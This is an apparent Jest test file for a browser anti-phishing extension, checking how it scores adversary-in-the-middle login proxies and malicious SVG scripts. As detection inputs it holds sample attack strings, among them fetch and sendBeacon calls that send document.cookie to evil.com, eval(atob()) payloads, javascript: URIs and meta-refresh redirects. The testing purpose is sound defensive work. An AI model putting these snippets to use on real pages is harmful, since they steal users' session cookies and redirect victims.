/**
 * LinkShield v8.6.0 Detection Tests
 * Tests for AiTM Proxy Detection and SVG Payload Detection
 *
 * Tests cover:
 * - AiTM: Microsoft/Google marker detection, scoring, legitimate provider bypass
 * - SVG: Dangerous script patterns, URI checks, foreignObject, scoring thresholds
 * - Edge cases: partial matches, trusted domains, config disabled states
 */

const fs = require('fs');
const path = require('path');

// Load config.js to get the actual configuration
const configPath = path.join(__dirname, '..', '..', 'config.js');
const configCode = fs.readFileSync(configPath, 'utf8');

// Execute config.js in a sandboxed context
let CONFIG;
const vm = require('vm');
const configContext = { window: {} };
vm.createContext(configContext);
vm.runInContext(configCode, configContext);
CONFIG = configContext.window.CONFIG;

// ============================================================================
// HELPER: Minimal DOM simulation for testing
// ============================================================================
class MockElement {
  constructor(tag, attrs = {}) {
    this.tagName = tag.toUpperCase();
    this.id = attrs.id || '';
    this.className = attrs.className || '';
    this.attributes = [];
    this._children = [];
    this._textContent = attrs.textContent || '';
    this._innerHTML = attrs.innerHTML || '';
    this.parentElement = null;
    this.type = attrs.type || '';
    this.src = attrs.src || '';

    // Build attributes array from attrs
    for (const [name, value] of Object.entries(attrs)) {
      if (['id', 'className', 'textContent', 'innerHTML', 'children'].includes(name)) continue;
      this.attributes.push({ name, value: String(value) });
    }
  }

  get textContent() { return this._textContent; }
  set textContent(v) { this._textContent = v; }
  get innerHTML() { return this._innerHTML; }
  set innerHTML(v) { this._innerHTML = v; }

  getAttribute(name) {
    if (name === 'id') return this.id;
    if (name === 'class') return this.className;
    const attr = this.attributes.find(a => a.name === name);
    return attr ? attr.value : null;
  }

  querySelector(selector) {
    // Simple selector matching for tests
    for (const child of this._flatChildren()) {
      if (matchesSelector(child, selector)) return child;
    }
    return null;
  }

  querySelectorAll(selector) {
    const results = [];
    for (const child of this._flatChildren()) {
      if (matchesSelector(child, selector)) results.push(child);
    }
    return results;
  }

  matches(selector) {
    return matchesSelector(this, selector);
  }

  _flatChildren() {
    const all = [];
    const walk = (node) => {
      for (const child of (node._children || [])) {
        all.push(child);
        walk(child);
      }
    };
    walk(this);
    return all;
  }

  appendChild(child) {
    child.parentElement = this;
    this._children.push(child);
    return child;
  }
}

function matchesSelector(el, selector) {
  if (!el) return false;
  // Handle comma-separated selectors
  if (selector.includes(',')) {
    return selector.split(',').some(s => matchesSelector(el, s.trim()));
  }
  // Simple ID selector
  if (selector.startsWith('#')) return el.id === selector.slice(1);
  // Class selector
  if (selector.startsWith('.')) return (el.className || '').split(' ').includes(selector.slice(1));
  // Tag selector
  if (/^[a-z]+$/i.test(selector)) return el.tagName === selector.toUpperCase();
  // Attribute selectors
  const attrMatch = selector.match(/\[([^=\]]+)(?:="([^"]*)")?\]/);
  if (attrMatch) {
    const attrName = attrMatch[1];
    const attrVal = attrMatch[2];
    const found = el.attributes.find(a => a.name === attrName);
    if (!found) return false;
    if (attrVal !== undefined) return found.value === attrVal;
    return true;
  }
  // Tag with attribute
  const tagAttrMatch = selector.match(/^([a-z]+)\[(.+)\]$/i);
  if (tagAttrMatch) {
    if (el.tagName !== tagAttrMatch[1].toUpperCase()) return false;
    return matchesSelector(el, `[${tagAttrMatch[2]}]`);
  }
  // input[type="password"]
  if (selector === 'input[type="password"]') {
    return el.tagName === 'INPUT' && el.getAttribute('type') === 'password';
  }
  return false;
}

// ============================================================================
// HELPER: Create test DOM environment
// ============================================================================
function createMockDocument(elements = {}) {
  const doc = {
    _elements: {},
    getElementById(id) {
      return this._elements[id] || null;
    },
    querySelector(selector) {
      for (const el of Object.values(this._elements)) {
        if (matchesSelector(el, selector)) return el;
      }
      // Check body children
      if (this.body) {
        const found = this.body.querySelector(selector);
        if (found) return found;
      }
      return null;
    },
    querySelectorAll(selector) {
      const results = [];
      for (const el of Object.values(this._elements)) {
        if (matchesSelector(el, selector)) results.push(el);
      }
      if (this.body) {
        results.push(...this.body.querySelectorAll(selector));
      }
      return results;
    },
    body: new MockElement('body')
  };

  // Register elements by ID
  for (const [id, el] of Object.entries(elements)) {
    el.id = id;
    doc._elements[id] = el;
  }

  return doc;
}

// ============================================================================
// AITM PROXY DETECTION TESTS
// ============================================================================
describe('AiTM Proxy Detection (v8.6.0)', () => {
  const aitmConfig = CONFIG.ADVANCED_THREAT_DETECTION.aitmDetection;

  describe('Configuration', () => {
    test('should have aitmDetection config section', () => {
      expect(aitmConfig).toBeDefined();
      expect(aitmConfig.enabled).toBe(true);
    });

    test('should have legitimate providers list', () => {
      expect(aitmConfig.legitimateProviders).toContain('login.microsoftonline.com');
      expect(aitmConfig.legitimateProviders).toContain('accounts.google.com');
      expect(aitmConfig.legitimateProviders).toContain('login.okta.com');
      expect(aitmConfig.legitimateProviders).toContain('auth0.com');
    });

    test('should have correct score values', () => {
      expect(aitmConfig.scores.msSpecificId).toBe(8);
      expect(aitmConfig.scores.googleSpecificId).toBe(8);
      expect(aitmConfig.scores.msButton).toBe(6);
      expect(aitmConfig.scores.googleButton).toBe(6);
      expect(aitmConfig.scores.msContainer).toBe(5);
      expect(aitmConfig.scores.passwordField).toBe(2);
      expect(aitmConfig.scores.suspiciousTLD).toBe(3);
      expect(aitmConfig.scores.freeHosting).toBe(3);
    });
  });

  describe('Microsoft Marker Scoring', () => {
    test('single marker #i0116 alone should NOT reach threshold (score=8 < 15)', () => {
      const score = aitmConfig.scores.msSpecificId; // 8
      expect(score).toBeLessThan(CONFIG.HIGH_THRESHOLD);
    });

    test('two MS-specific IDs (#i0116 + #i0118) should reach threshold (score=16 >= 15)', () => {
      const score = aitmConfig.scores.msSpecificId * 2; // 16
      expect(score).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });

    test('#i0116 + #idSIButton9 should reach threshold (score=14, +password=16)', () => {
      const score = aitmConfig.scores.msSpecificId + aitmConfig.scores.msButton + aitmConfig.scores.passwordField;
      expect(score).toBe(16);
      expect(score).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });

    test('#i0116 + container alone should NOT reach threshold (score=13)', () => {
      const score = aitmConfig.scores.msSpecificId + aitmConfig.scores.msContainer;
      expect(score).toBe(13);
      expect(score).toBeLessThan(CONFIG.HIGH_THRESHOLD);
    });

    test('#i0116 + container + password should reach threshold (score=15)', () => {
      const score = aitmConfig.scores.msSpecificId + aitmConfig.scores.msContainer + aitmConfig.scores.passwordField;
      expect(score).toBe(15);
      expect(score).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });

    test('#i0116 + msOAuthPath + suspiciousTLD should reach threshold (score=16)', () => {
      // This requires provider detection first (msScore >= 8)
      const msScore = aitmConfig.scores.msSpecificId; // 8 - meets provider threshold
      const totalScore = msScore + aitmConfig.scores.msOAuthPath + aitmConfig.scores.suspiciousTLD;
      expect(totalScore).toBe(16);
      expect(totalScore).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });
  });

  describe('Google Marker Scoring', () => {
    test('single #identifierId alone should NOT reach threshold (score=8 < 15)', () => {
      const score = aitmConfig.scores.googleSpecificId; // 8
      expect(score).toBeLessThan(CONFIG.HIGH_THRESHOLD);
    });

    test('#identifierId + #passwordNext should reach threshold with password (score=16)', () => {
      const score = aitmConfig.scores.googleSpecificId + aitmConfig.scores.googleButton + aitmConfig.scores.passwordField;
      expect(score).toBe(16);
      expect(score).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });

    test('#identifierId + Google class + loginPath should reach threshold (score=18)', () => {
      const score = aitmConfig.scores.googleSpecificId + aitmConfig.scores.googleClass + aitmConfig.scores.googleLoginPath;
      expect(score).toBe(18);
      expect(score).toBeGreaterThanOrEqual(CONFIG.HIGH_THRESHOLD);
    });

    test('#identifierId + freeHosting + password should NOT reach threshold (score=13)', () => {
      // freeHosting is universal signal, only added if provider detected (score >= 8)
      const googleScore = aitmConfig.scores.googleSpecificId; // 8
      const totalScore = googleScore + aitmConfig.scores.freeHosting + aitmConfig.scores.passwordField;
      expect(totalScore).toBe(13);
      expect(totalScore).toBeLessThan(CONFIG.HIGH_THRESHOLD);
    });
  });

  describe('Legitimate Provider Bypass', () => {
    test('login.microsoftonline.com should be whitelisted', () => {
      const hostname = 'login.microsoftonline.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });

    test('accounts.google.com should be whitelisted', () => {
      const hostname = 'accounts.google.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });

    test('subdomain.login.microsoftonline.com should be whitelisted', () => {
      const hostname = 'subdomain.login.microsoftonline.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });

    test('evil-login.microsoftonline.com.evil.xyz should NOT be whitelisted', () => {
      const hostname = 'evil-login.microsoftonline.com.evil.xyz';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(false);
    });

    test('microsoftonline.com.phishing.xyz should NOT be whitelisted', () => {
      const hostname = 'microsoftonline.com.phishing.xyz';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(false);
    });

    test('office.com should be whitelisted', () => {
      const hostname = 'office.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });

    test('login.okta.com should be whitelisted', () => {
      const hostname = 'login.okta.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });

    test('login.salesforce.com should be whitelisted', () => {
      const hostname = 'login.salesforce.com';
      const isLegit = aitmConfig.legitimateProviders.some(p => hostname === p || hostname.endsWith('.' + p));
      expect(isLegit).toBe(true);
    });
  });

  describe('Universal Signal Scoring', () => {
    test('suspicious TLD should add 3 points', () => {
      expect(aitmConfig.scores.suspiciousTLD).toBe(3);
      // Verify .xyz is suspicious
      expect(CONFIG.isSuspiciousTLD('xyz')).toBe(true);
    });

    test('free hosting domain should add 3 points', () => {
      expect(aitmConfig.scores.freeHosting).toBe(3);
      // Verify vercel.app is in free hosting list
      expect(CONFIG.FREE_HOSTING_DOMAINS).toContain('vercel.app');
    });

    test('password field should add 2 points', () => {
      expect(aitmConfig.scores.passwordField).toBe(2);
    });

    test('universal signals alone should never trigger (max 8 points without provider)', () => {
      // Even if all universal signals match, without a provider (score >= 8), they won't be added
      const maxUniversal = aitmConfig.scores.passwordField + aitmConfig.scores.suspiciousTLD + aitmConfig.scores.freeHosting;
      expect(maxUniversal).toBe(8);
      // But universal signals are only added IF a provider is detected
      // So a page with just a password field + suspicious TLD won't trigger
    });
  });

  describe('Edge Cases', () => {
    test('page with only password field should NOT trigger (no provider markers)', () => {
      // Only password fields without MS/Google markers = score 0
      // Password field score is only added after provider detection
    });

    test('page with legitimate login form (no MS/Google IDs) should NOT trigger', () => {
      // A custom login form without Microsoft/Google specific IDs should not trigger
      // e.g., <input id="email"> <input id="password" type="password">
    });

    test('provider threshold: msScore must be >= 8 to detect provider', () => {
      // msContainer alone (5) should not set provider
      const containerOnly = aitmConfig.scores.msContainer;
      expect(containerOnly).toBeLessThan(8);
    });

    test('provider threshold: googleScore must be >= 8 to detect provider', () => {
      // googleClass alone (5) should not set provider
      const classOnly = aitmConfig.scores.googleClass;
      expect(classOnly).toBeLessThan(8);
    });

    test('Microsoft wins over Google when both markers present with higher score', () => {
      const msScore = aitmConfig.scores.msSpecificId * 2; // 16
      const googleScore = aitmConfig.scores.googleSpecificId; // 8
      expect(msScore).toBeGreaterThan(googleScore);
      // Logic: if (msScore > googleScore && msScore >= 8) -> detectedProvider = 'Microsoft'
    });

    test('Google wins when Google score is higher', () => {
      const msScore = aitmConfig.scores.msContainer; // 5
      const googleScore = aitmConfig.scores.googleSpecificId + aitmConfig.scores.googleButton; // 14
      expect(googleScore).toBeGreaterThan(msScore);
    });
  });
});

// ============================================================================
// SVG PAYLOAD DETECTION TESTS
// ============================================================================
describe('SVG Payload Detection (v8.6.0)', () => {
  const svgConfig = CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection;

  describe('Configuration', () => {
    test('should have svgPayloadDetection config section', () => {
      expect(svgConfig).toBeDefined();
      expect(svgConfig.enabled).toBe(true);
    });

    test('should have score threshold of 15', () => {
      expect(svgConfig.scoreThreshold).toBe(15);
    });

    test('should have dangerous script patterns', () => {
      expect(svgConfig.dangerousScriptPatterns).toBeDefined();
      expect(svgConfig.dangerousScriptPatterns.length).toBe(13);
    });

    test('should have dangerous URI patterns', () => {
      expect(svgConfig.dangerousURIPatterns).toBeDefined();
      expect(svgConfig.dangerousURIPatterns.length).toBe(3);
    });

    test('should have correct score values', () => {
      expect(svgConfig.scores.dangerousScript).toBe(10);
      expect(svgConfig.scores.dangerousURI).toBe(12);
      expect(svgConfig.scores.maliciousEventHandler).toBe(5);
      expect(svgConfig.scores.base64Eval).toBe(8);
      expect(svgConfig.scores.foreignObjectRedirect).toBe(10);
    });
  });

  describe('Dangerous Script Pattern Matching', () => {
    const patterns = svgConfig.dangerousScriptPatterns;

    test('should detect eval()', () => {
      expect(patterns.some(p => p.test('eval("malicious")'))).toBe(true);
      expect(patterns.some(p => p.test('eval(atob("encoded"))'))).toBe(true);
    });

    test('should detect document.cookie access', () => {
      expect(patterns.some(p => p.test('var x = document.cookie'))).toBe(true);
      expect(patterns.some(p => p.test('fetch(url, {body: document.cookie})'))).toBe(true);
    });

    test('should detect window.location assignment', () => {
      expect(patterns.some(p => p.test('window.location = "https://evil.com"'))).toBe(true);
      expect(patterns.some(p => p.test('window.location ="https://evil.com"'))).toBe(true);
    });

    test('should detect fetch to external URL', () => {
      expect(patterns.some(p => p.test('fetch("https://evil.com/steal")'))).toBe(true);
      expect(patterns.some(p => p.test("fetch('http://evil.com/data')"))).toBe(true);
    });

    test('should detect navigator.sendBeacon', () => {
      expect(patterns.some(p => p.test('navigator.sendBeacon("https://evil.com", data)'))).toBe(true);
    });

    test('should detect atob()', () => {
      expect(patterns.some(p => p.test('var decoded = atob("SGVsbG8=")'))).toBe(true);
    });

    test('should detect document.write()', () => {
      expect(patterns.some(p => p.test('document.write("<script>evil()</script>")'))).toBe(true);
    });

    test('should detect innerHTML assignment', () => {
      expect(patterns.some(p => p.test('el.innerHTML = "<img onerror=evil()>"'))).toBe(true);
      expect(patterns.some(p => p.test('document.body.innerHTML = payload'))).toBe(true);
    });

    test('should detect new Function()', () => {
      expect(patterns.some(p => p.test('new Function("return evil()")'))).toBe(true);
    });

    test('should detect XMLHttpRequest', () => {
      expect(patterns.some(p => p.test('var xhr = new XMLHttpRequest()'))).toBe(true);
    });

    test('should detect data: src assignment', () => {
      expect(patterns.some(p => p.test('img.src = "data:text/html,<script>..."'))).toBe(true);
    });

    test('should detect fromCharCode', () => {
      expect(patterns.some(p => p.test('String.fromCharCode(72,101,108)'))).toBe(true);
    });

    test('should detect setTimeout with string', () => {
      expect(patterns.some(p => p.test('setTimeout("evil()", 100)'))).toBe(true);
    });

    // FALSE POSITIVE PREVENTION
    test('should NOT flag simple variable assignment', () => {
      const code = 'var x = 5; var y = x + 1;';
      expect(patterns.some(p => p.test(code))).toBe(false);
    });

    test('should NOT flag console.log', () => {
      const code = 'console.log("hello world");';
      expect(patterns.some(p => p.test(code))).toBe(false);
    });

    test('should NOT flag legitimate animation code', () => {
      const code = 'function animate() { requestAnimationFrame(animate); el.style.opacity = 0.5; }';
      expect(patterns.some(p => p.test(code))).toBe(false);
    });

    test('should NOT flag d3.js style DOM manipulation (no dangerous patterns)', () => {
      const code = 'svg.append("circle").attr("cx", 50).attr("cy", 50).attr("r", 20);';
      expect(patterns.some(p => p.test(code))).toBe(false);
    });

    test('should NOT flag SVG animation script (no dangerous patterns)', () => {
      const code = 'var circle = document.getElementById("myCircle"); circle.setAttribute("r", "25");';
      expect(patterns.some(p => p.test(code))).toBe(false);
    });
  });

  describe('Dangerous URI Pattern Matching', () => {
    const uriPatterns = svgConfig.dangerousURIPatterns;

    test('should detect javascript: URIs', () => {
      expect(uriPatterns.some(p => p.test('javascript:alert(1)'))).toBe(true);
      expect(uriPatterns.some(p => p.test('javascript:void(0)'))).toBe(true);
      expect(uriPatterns.some(p => p.test('JAVASCRIPT:alert(1)'))).toBe(true); // case-insensitive
    });

    test('should detect data:text/html URIs', () => {
      expect(uriPatterns.some(p => p.test('data:text/html,<script>evil()</script>'))).toBe(true);
      expect(uriPatterns.some(p => p.test('data:text/html;base64,PHNjcmlw...'))).toBe(true);
    });

    test('should detect data:application/x-javascript URIs', () => {
      expect(uriPatterns.some(p => p.test('data:application/x-javascript,alert(1)'))).toBe(true);
    });

    // FALSE POSITIVE PREVENTION
    test('should NOT flag regular https: URLs', () => {
      expect(uriPatterns.some(p => p.test('https://example.com'))).toBe(false);
    });

    test('should NOT flag data:image URIs', () => {
      expect(uriPatterns.some(p => p.test('data:image/png;base64,iVBOR...'))).toBe(false);
    });

    test('should NOT flag mailto: URIs', () => {
      expect(uriPatterns.some(p => p.test('mailto:test@example.com'))).toBe(false);
    });

    test('should NOT flag # fragment links', () => {
      expect(uriPatterns.some(p => p.test('#section1'))).toBe(false);
    });
  });

  describe('Score Threshold Tests', () => {
    test('single dangerous script (10) should NOT reach threshold', () => {
      expect(svgConfig.scores.dangerousScript).toBeLessThan(svgConfig.scoreThreshold);
    });

    test('single dangerous URI (12) should NOT reach threshold', () => {
      expect(svgConfig.scores.dangerousURI).toBeLessThan(svgConfig.scoreThreshold);
    });

    test('dangerous script + base64Eval should reach threshold (10+8=18)', () => {
      const score = svgConfig.scores.dangerousScript + svgConfig.scores.base64Eval;
      expect(score).toBe(18);
      expect(score).toBeGreaterThanOrEqual(svgConfig.scoreThreshold);
    });

    test('dangerous script + foreignObject redirect should reach threshold (10+10=20)', () => {
      const score = svgConfig.scores.dangerousScript + svgConfig.scores.foreignObjectRedirect;
      expect(score).toBe(20);
      expect(score).toBeGreaterThanOrEqual(svgConfig.scoreThreshold);
    });

    test('dangerous URI + malicious event handler should reach threshold (12+5=17)', () => {
      // Note: event handler only scored if other indicators found
      const score = svgConfig.scores.dangerousURI + svgConfig.scores.maliciousEventHandler;
      expect(score).toBe(17);
      expect(score).toBeGreaterThanOrEqual(svgConfig.scoreThreshold);
    });

    test('dangerous script + dangerousURI should reach threshold (10+12=22)', () => {
      const score = svgConfig.scores.dangerousScript + svgConfig.scores.dangerousURI;
      expect(score).toBe(22);
      expect(score).toBeGreaterThanOrEqual(svgConfig.scoreThreshold);
    });

    test('foreignObject redirect alone (10) should NOT reach threshold', () => {
      expect(svgConfig.scores.foreignObjectRedirect).toBeLessThan(svgConfig.scoreThreshold);
    });

    test('base64Eval alone (8) should NOT reach threshold', () => {
      expect(svgConfig.scores.base64Eval).toBeLessThan(svgConfig.scoreThreshold);
    });

    test('event handler alone (5) should NOT reach threshold', () => {
      expect(svgConfig.scores.maliciousEventHandler).toBeLessThan(svgConfig.scoreThreshold);
    });
  });

  describe('ForeignObject Redirect Detection', () => {
    test('window.location in foreignObject should be detected', () => {
      const content = '<div>window.location = "https://evil.com"</div>';
      expect(/window\.location/i.test(content)).toBe(true);
    });

    test('meta refresh in foreignObject should be detected', () => {
      const content = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
      expect(/meta\s+http-equiv\s*=\s*["']refresh/i.test(content)).toBe(true);
    });

    test('document.location in foreignObject should be detected', () => {
      const content = 'document.location.href = "https://evil.com"';
      expect(/document\.location/i.test(content)).toBe(true);
    });

    // FALSE POSITIVE PREVENTION
    test('foreignObject with regular HTML content should NOT be detected', () => {
      const content = '<div><p>Hello World</p><a href="https://example.com">Link</a></div>';
      expect(/window\.location/i.test(content)).toBe(false);
      expect(/meta\s+http-equiv\s*=\s*["']refresh/i.test(content)).toBe(false);
      expect(/document\.location/i.test(content)).toBe(false);
    });

    test('foreignObject with form should NOT be detected', () => {
      const content = '<form action="/submit"><input name="field"><button>Submit</button></form>';
      expect(/window\.location/i.test(content)).toBe(false);
    });
  });

  describe('Base64 + Eval Combination', () => {
    test('atob + eval in same script should be detected', () => {
      const content = 'eval(atob("YWxlcnQoMSk="))';
      expect(/\batob\b/i.test(content) && /\beval\b/i.test(content)).toBe(true);
    });

    test('atob without eval should NOT trigger base64Eval combo', () => {
      const content = 'var decoded = atob("SGVsbG8="); console.log(decoded);';
      expect(/\batob\b/i.test(content)).toBe(true);
      expect(/\beval\b/i.test(content)).toBe(false);
    });

    test('eval without atob should NOT trigger base64Eval combo', () => {
      const content = 'eval("1+1")';
      expect(/\batob\b/i.test(content)).toBe(false);
      expect(/\beval\b/i.test(content)).toBe(true);
    });
  });

  describe('Event Handler Edge Cases', () => {
    test('event handlers only scored if other indicators present', () => {
      // The logic: if (svgIndicators.length > 0) then check event handlers
      // So event handlers alone never contribute to score
      expect(svgConfig.scores.maliciousEventHandler).toBe(5);
    });

    test('onclick with eval should be flagged (when other indicators present)', () => {
      const handlerContent = 'eval(document.cookie)';
      expect(svgConfig.dangerousScriptPatterns.some(p => p.test(handlerContent))).toBe(true);
    });

    test('onclick with simple function call should NOT be flagged', () => {
      const handlerContent = 'toggleVisibility()';
      expect(svgConfig.dangerousScriptPatterns.some(p => p.test(handlerContent))).toBe(false);
    });

    test('onmouseover with alert should NOT be flagged (not in dangerous patterns)', () => {
      const handlerContent = 'alert("hello")';
      // alert is not in the dangerous patterns list (intentionally excluded - low risk)
      expect(svgConfig.dangerousScriptPatterns.some(p => p.test(handlerContent))).toBe(false);
    });
  });

  describe('Scan Scope', () => {
    test('<img src="*.svg"> should NOT be scanned (browsers block scripts)', () => {
      // The implementation only scans: inline <svg>, <object type="image/svg+xml">, <embed type="image/svg+xml">
      // <img> tags are explicitly excluded per the plan
      // This is validated by the querySelectorAll calls in detectSVGPayloads()
    });

    test('cross-origin object/embed should be skipped (try/catch handles SecurityError)', () => {
      // The implementation wraps contentDocument access in try/catch
      // Cross-origin access throws SecurityError which is caught
    });
  });
});

// ============================================================================
// INTEGRATION: Score Calculation Simulation
// ============================================================================
describe('AiTM Detection - Score Calculation Simulation', () => {
  const aitmConfig = CONFIG.ADVANCED_THREAT_DETECTION.aitmDetection;

  function simulateAiTMScore(markers, hostname) {
    let msScore = 0;
    let googleScore = 0;
    const indicators = [];

    // Microsoft markers
    if (markers.includes('i0116')) { msScore += aitmConfig.scores.msSpecificId; indicators.push('ms_email'); }
    if (markers.includes('i0118')) { msScore += aitmConfig.scores.msSpecificId; indicators.push('ms_password'); }
    if (markers.includes('idSIButton9')) { msScore += aitmConfig.scores.msButton; indicators.push('ms_button'); }
    if (markers.includes('lightbox') || markers.includes('login-paginated-page')) { msScore += aitmConfig.scores.msContainer; indicators.push('ms_container'); }
    if (markers.includes('ext-sign-in-box')) { msScore += aitmConfig.scores.msContainer; indicators.push('ms_signin_box'); }
    if (markers.includes('oauth2_path')) { msScore += aitmConfig.scores.msOAuthPath; indicators.push('ms_oauth_path'); }

    // Google markers
    if (markers.includes('identifierId')) { googleScore += aitmConfig.scores.googleSpecificId; indicators.push('google_id'); }
    if (markers.includes('passwordNext') || markers.includes('identifierNext')) { googleScore += aitmConfig.scores.googleButton; indicators.push('google_button'); }
    if (markers.includes('OLlbdf') || markers.includes('U26fgb')) { googleScore += aitmConfig.scores.googleClass; indicators.push('google_class'); }
    if (markers.includes('ServiceLogin')) { googleScore += aitmConfig.scores.googleLoginPath; indicators.push('google_path'); }

    let score = 0;
    let provider = null;

    if (msScore > googleScore && msScore >= 8) {
      score = msScore;
      provider = 'Microsoft';
    } else if (googleScore >= 8) {
      score = googleScore;
      provider = 'Google';
    }

    // Universal signals
    if (provider) {
      if (markers.includes('password_field')) { score += aitmConfig.scores.passwordField; }
      if (markers.includes('suspicious_tld')) { score += aitmConfig.scores.suspiciousTLD; }
      if (markers.includes('free_hosting')) { score += aitmConfig.scores.freeHosting; }
    }

    return { score, provider, detected: score >= CONFIG.HIGH_THRESHOLD, indicators };
  }

  // Real-world attack scenarios
  test('Evilginx Microsoft proxy: i0116 + i0118 + password', () => {
    const result = simulateAiTMScore(['i0116', 'i0118', 'password_field'], 'login-ms.evil.xyz');
    expect(result.detected).toBe(true);
    expect(result.provider).toBe('Microsoft');
    expect(result.score).toBe(18); // 8+8+2
  });

  test('Tycoon 2FA Google proxy: identifierId + passwordNext + password', () => {
    const result = simulateAiTMScore(['identifierId', 'passwordNext', 'password_field'], 'accounts-google.phish.xyz');
    expect(result.detected).toBe(true);
    expect(result.provider).toBe('Google');
    expect(result.score).toBe(16); // 8+6+2
  });

  test('Evilginx MS with all markers: i0116 + i0118 + idSIButton9 + lightbox + oauth path', () => {
    const result = simulateAiTMScore(['i0116', 'i0118', 'idSIButton9', 'lightbox', 'oauth2_path', 'password_field'], 'login.evil.com');
    expect(result.detected).toBe(true);
    expect(result.provider).toBe('Microsoft');
    expect(result.score).toBe(34); // 8+8+6+5+5+2 = 34
  });

  test('On free hosting with suspicious TLD: i0116 + i0118 + suspicious_tld + free_hosting', () => {
    const result = simulateAiTMScore(['i0116', 'i0118', 'suspicious_tld', 'free_hosting'], 'ms-login.evil.xyz');
    expect(result.detected).toBe(true);
    expect(result.score).toBe(22); // 8+8+3+3
  });

  // False positive scenarios
  test('Legitimate login form (no MS/Google IDs): password_field only', () => {
    const result = simulateAiTMScore(['password_field'], 'example.com');
    expect(result.detected).toBe(false);
    expect(result.provider).toBe(null);
    expect(result.score).toBe(0); // No provider detected, so no universal signals
  });

  test('Custom login with only container class (no specific IDs)', () => {
    const result = simulateAiTMScore(['lightbox', 'password_field'], 'example.com');
    expect(result.detected).toBe(false);
    expect(result.provider).toBe(null);
    expect(result.score).toBe(0); // msScore = 5 < 8, so no provider
  });

  test('Page with only Google class (score < 8): OLlbdf only', () => {
    const result = simulateAiTMScore(['OLlbdf'], 'example.com');
    expect(result.detected).toBe(false);
    expect(result.provider).toBe(null);
  });

  test('Page with OAuth path but no specific IDs: oauth2_path + password', () => {
    const result = simulateAiTMScore(['oauth2_path', 'password_field'], 'example.com');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(0); // msScore = 5 < 8
  });

  test('Both MS and Google markers present, MS wins (higher score)', () => {
    const result = simulateAiTMScore(['i0116', 'i0118', 'identifierId'], 'evil.com');
    expect(result.provider).toBe('Microsoft');
    expect(result.score).toBe(16); // MS: 16 > Google: 8
  });

  test('Both MS and Google markers, Google wins (higher score)', () => {
    const result = simulateAiTMScore(['lightbox', 'identifierId', 'passwordNext'], 'evil.com');
    expect(result.provider).toBe('Google');
    // MS: 5 (container) - below 8 threshold
    // Google: 8 + 6 = 14 >= 8
    expect(result.score).toBe(14);
    expect(result.detected).toBe(false); // 14 < 15
  });
});

describe('SVG Payload Detection - Score Calculation Simulation', () => {
  const svgConfig = CONFIG.ADVANCED_THREAT_DETECTION.svgPayloadDetection;

  function simulateSVGScore(scriptContent, hrefs = [], foreignObjectContent = '', hasEventHandlers = false) {
    let score = 0;
    const indicators = [];

    // Check script content
    if (scriptContent) {
      for (const pattern of svgConfig.dangerousScriptPatterns) {
        if (pattern.test(scriptContent)) {
          score += svgConfig.scores.dangerousScript;
          indicators.push('dangerous_script');
          break; // One match per script
        }
      }
      // Check atob + eval combo
      if (/\batob\b/i.test(scriptContent) && /\beval\b/i.test(scriptContent)) {
        score += svgConfig.scores.base64Eval;
        indicators.push('base64_eval');
      }
    }

    // Check URIs
    for (const href of hrefs) {
      for (const pattern of svgConfig.dangerousURIPatterns) {
        if (pattern.test(href)) {
          score += svgConfig.scores.dangerousURI;
          indicators.push('dangerous_uri');
          break;
        }
      }
    }

    // Check foreignObject
    if (foreignObjectContent) {
      if (/window\.location/i.test(foreignObjectContent) ||
          /meta\s+http-equiv\s*=\s*["']refresh/i.test(foreignObjectContent) ||
          /document\.location/i.test(foreignObjectContent)) {
        score += svgConfig.scores.foreignObjectRedirect;
        indicators.push('foreignobject_redirect');
      }
    }

    // Event handlers only if other indicators found
    if (hasEventHandlers && indicators.length > 0) {
      score += svgConfig.scores.maliciousEventHandler;
      indicators.push('event_handler');
    }

    return { score, detected: score >= svgConfig.scoreThreshold, indicators };
  }

  // Attack scenarios
  test('SVG with eval(atob(...)) - credential stealer', () => {
    const result = simulateSVGScore('eval(atob("ZG9jdW1lbnQuY29va2ll"))');
    expect(result.detected).toBe(true);
    expect(result.score).toBe(18); // dangerousScript(10) + base64Eval(8)
  });

  test('SVG with fetch to external URL (single match = 10, below threshold)', () => {
    const result = simulateSVGScore('fetch("https://evil.com/steal?data=" + document.cookie)');
    // Loop breaks after first pattern match, so only ONE dangerousScript score (10)
    // 10 < 15 threshold, so not detected
    expect(result.detected).toBe(false);
    expect(result.score).toBe(10);
  });

  test('SVG with fetch to external URL should NOT trigger alone (10 < 15)', () => {
    const result = simulateSVGScore('fetch("https://evil.com/steal")');
    expect(result.detected).toBe(false);
    expect(result.score).toBe(10);
  });

  test('SVG with javascript: href', () => {
    const result = simulateSVGScore('', ['javascript:alert(document.cookie)']);
    expect(result.detected).toBe(false); // 12 < 15
    expect(result.score).toBe(12);
  });

  test('SVG with javascript: href + dangerous script', () => {
    const result = simulateSVGScore('eval("evil()")', ['javascript:void(0)']);
    expect(result.detected).toBe(true);
    expect(result.score).toBe(22); // 10 + 12
  });

  test('SVG with foreignObject redirect + dangerous script', () => {
    const result = simulateSVGScore('document.write("<script>evil</script>")', [], 'window.location = "https://evil.com"');
    expect(result.detected).toBe(true);
    expect(result.score).toBe(20); // 10 + 10
  });

  test('SVG with only foreignObject redirect (10 < 15)', () => {
